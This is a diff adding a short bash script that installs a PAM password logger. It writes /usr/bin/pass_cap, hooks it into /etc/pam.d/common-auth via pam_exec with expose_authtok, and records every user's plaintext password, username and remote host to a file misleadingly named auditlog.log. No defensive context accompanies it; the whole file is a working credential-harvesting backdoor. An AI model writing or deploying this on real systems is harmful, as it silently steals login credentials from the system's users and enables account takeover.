@@ -1,0 +1,12 @@
+#!/bin/bash 
+
+touch /usr/bin/pass_cap
+touch /var/log/auditlog.log
+
+echo '#!/bin/sh' >> /usr/bin/pass_cap
+echo 'echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/auditlog.log' >> /usr/bin/pass_cap 
+
+chmod 755 /usr/bin/pass_cap
+
+echo 'auth optional pam_exec.so seteuid quiet expose_authtok /usr/bin/pass_cap' >> /etc/pam.d/common-auth
+
